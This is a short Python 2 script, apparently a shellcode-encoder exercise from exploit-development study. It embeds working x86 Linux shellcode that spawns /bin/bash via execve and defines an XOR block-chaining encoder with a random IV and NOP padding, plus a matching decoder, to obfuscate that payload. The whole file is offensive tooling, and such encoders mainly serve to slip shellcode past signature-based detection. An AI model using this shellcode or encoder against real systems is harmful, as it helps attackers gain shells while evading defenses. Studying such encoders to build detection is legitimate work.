#!/usr/bin/python

from random import randint

shellcode = "\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

def fbxencode(shellcode):
        iv = '%x' % randint(1,0xffffffff)
        t = iter(iv)
        iv = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
        while ('\\x00' in iv):
                iv = '%x' % randint(1,0xffffffff)
                t = iter(iv)
                iv = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
	#iv = "\\xaa\\x57\\x2c\\x56"
        code = iv + shellcode + '\\x90' * (4 - shellcode.count('\\x') % 4 + 4)

        print code

        code = code.replace('\\x', '')

        blocks = []
        for i in range(0, len(code)/8):
                blocks.append(int('0x'+ code[i*8:i*8+8], 16))

	# print "BLOCKS[0]=" + format(blocks[0], '08x')
        for i in range(len(blocks)-1):
                blocks[i+1] = (blocks[i] ^ blocks[i+1])
		# print "BLOCKS[" + str(i+1) + "]=" + format(blocks[i+1], '08x')

	ciphertext = ""
	for i in range(len(blocks)):
		ciphertext += format(blocks[i], '08x')
	# print(ciphertext)

        t = iter(ciphertext)
	print "Ciphertext = " + '0x' + ',0x'.join(a+b for a,b in zip(t, t))
	t = iter(ciphertext)
        ciphertext = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
        return ciphertext

def fbxdecode(ciphertext):

	ciphertext = ciphertext.replace('\\x','')

        blocks = []
	plaintext = ""

        for i in range(0, len(ciphertext)/8):
                blocks.append(int('0x'+ ciphertext[i*8:i*8+8], 16))

        for i in range(len(blocks)-1):
		if (blocks[i] ^ blocks[i+1] == 0x90909090):
			break
                blocks[i] = (blocks[i] ^ blocks[i+1])
                # print "BLOCKS[" + str(i) + "]=" + format(blocks[i], '08x')
                plaintext += format(blocks[i], '08x')

	print(plaintext)

        t = iter(plaintext)
        plaintext = '\\x' + '\\x'.join(a+b for a,b in zip(t, t))
        return plaintext

print "Shellcode = " + shellcode

ciphertext = fbxencode(shellcode)
print "Ciphertext = " + ciphertext
plaintext = fbxdecode(ciphertext)
print "Plaintext = " + plaintext
